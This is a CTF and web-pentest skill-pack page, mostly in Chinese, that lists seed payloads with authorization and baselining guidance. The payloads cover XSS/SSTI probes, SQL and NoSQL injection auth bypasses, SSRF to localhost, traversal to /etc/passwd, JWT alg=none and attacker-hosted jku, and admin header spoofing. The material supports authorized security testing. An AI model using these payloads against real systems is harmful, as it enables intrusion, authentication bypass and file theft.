# Web Payload Seeds

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/payloads/web-payload-seeds.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **能力域**：本文为技术能力说明，按项目 `scope.md` 直接套用。
> **什么时候用**：命中「见适用信号」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- 见下方「技术正文」的条目式打点清单（本文档正文以清单为主，无结构化信号表）。

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。

## 步骤

本文正文按下列小节顺序推进，**每一步的完整命令与脚本在「技术正文」对应小节里**（这类文档以代码体 + 表格为主，按小节读比按 bullet 读快）：

1. Reflection / HTML
2. SQLi
3. NoSQLi JSON
4. SSRF
5. Traversal
6. JWT
7. Headers

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- 复现同一请求两次，状态码 + 响应体 hash 必须稳定；不稳定说明是噪声源（时间戳/随机数/缓存），先校准 baseline。
- 判为命中的最低门槛：同一 session 下**只有被测变量不同**，业务字段（身份/订单状态/flag）发生可复现变化。

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

These are starting points, not final exploits. Always confirm context first.

## Reflection / HTML

```text
<test>
"'><svg/onload=alert(1)>
{{7*7}}
${7*7}
```

## SQLi

```text
'
"
' OR '1'='1'--
' AND '1'='2'--
1 OR 1=1
1 AND 1=2
```

## NoSQLi JSON

```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"$or":[{"role":"admin"},{"role":{"$ne":"user"}}]}
```

## SSRF

```text
http://127.0.0.1/
http://localhost/
http://[::1]/
http://2130706433/
http://allowed.example@127.0.0.1/
```

## Traversal

```text
../
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//etc/passwd
```

## JWT

```text
alg=none
kid=../../../../dev/null
jku=https://attacker-controlled/jwks.json
```

## Headers

```text
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Original-URL: /admin
X-Rewrite-URL: /admin
```
